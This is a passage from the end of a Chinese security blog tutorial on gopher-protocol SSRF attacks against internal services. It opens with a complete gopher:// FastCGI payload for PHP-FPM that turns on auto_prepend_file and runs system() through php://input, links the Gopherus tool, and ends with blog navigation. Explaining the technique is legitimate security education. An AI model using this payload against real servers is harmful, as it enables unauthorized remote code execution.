+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH69%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;usr&#x2F;share&#x2F;php&#x2F;PEAR.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00E%04%00%3C%3Fphp%20system%28%27%3C%3Fphp%20phpinfo%28%3B%3F%3E%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<p>github地址：</p>
+<p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%e6%94%bb%e5%87%bb%e5%86%85%e7%bd%91%e5%ba%94%e7%94%a8%e5%a4%8d%e7%8e%b0/</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/30/Redis-Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" rel="next" title="Redis&Fastcgi未授权访问漏洞">
+                <i class="fa fa-chevron-left"></i> Redis&Fastcgi未授权访问漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/30/%E5%88%A9%E7%94%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2/" rel="prev" title="利用phar反序列化拓展攻击面">
+                利用phar反序列化拓展攻击面 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher协议攻击内网Mysql"><span class="nav-number">1.</span> <span class="nav-text">gopher协议攻击内网Mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql介绍"><span class="nav-number">1.2.</span> <span class="nav-text">Mysql介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql认证过程："><span class="nav-number">1.3.</span> <span class="nav-text">Mysql认证过程：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击复现"><span class="nav-number">1.4.</span> <span class="nav-text">攻击复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher协议与Mysql客户端任意文件读取组合拳"><span class="nav-number">1.5.</span> <span class="nav-text">gopher协议与Mysql客户端任意文件读取组合拳</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher协议攻击内网Redis"><span class="nav-number">2.</span> <span class="nav-text">gopher协议攻击内网Redis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher协议攻击内网Fastcgi"><span class="nav-number">3.</span> <span class="nav-text">gopher协议攻击内网Fastcgi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
